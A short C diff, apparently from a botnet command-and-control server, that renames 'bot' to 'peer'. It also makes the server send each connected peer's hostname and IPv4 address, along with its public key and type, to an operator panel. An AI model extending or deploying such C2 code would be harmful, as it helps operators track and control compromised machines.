@@ -21,22 +21,24 @@ bool sendPanelPeerIter(struct sLaika_socket *sock, void *uData) {
     return true;
 }
 
-void laikaC_sendNewPeer(struct sLaika_peer *panel, struct sLaika_peer *bot) {
+void laikaC_sendNewPeer(struct sLaika_peer *panel, struct sLaika_peer *peer) {
     laikaS_startOutPacket(panel, LAIKAPKT_AUTHENTICATED_ADD_PEER);
 
-    /* write the bot's pubkey & peerType */
-    laikaS_write(&panel->sock, bot->peerPub, sizeof(bot->peerPub));
-    laikaS_writeByte(&panel->sock, bot->type);
+    /* write the peer's info */
+    laikaS_write(&panel->sock, peer->peerPub, sizeof(peer->peerPub));
+    laikaS_write(&panel->sock, peer->hostname, LAIKA_HOSTNAME_LEN);
+    laikaS_write(&panel->sock, peer->ipv4, LAIKA_IPV4_LEN);
+    laikaS_writeByte(&panel->sock, peer->type);
 
     laikaS_endOutPacket(panel);
 }
 
-void laikaC_sendRmvPeer(struct sLaika_peer *panel, struct sLaika_peer *bot) {
+void laikaC_sendRmvPeer(struct sLaika_peer *panel, struct sLaika_peer *peer) {
     laikaS_startOutPacket(panel, LAIKAPKT_AUTHENTICATED_RMV_PEER);
 
-    /* write the bot's pubkey */
-    laikaS_write(&panel->sock, bot->peerPub, sizeof(bot->peerPub));
-    laikaS_writeByte(&panel->sock, bot->type);
+    /* write the peer's pubkey */
+    laikaS_write(&panel->sock, peer->peerPub, sizeof(peer->peerPub));
+    laikaS_writeByte(&panel->sock, peer->type);
 
     laikaS_endOutPacket(panel);
 }
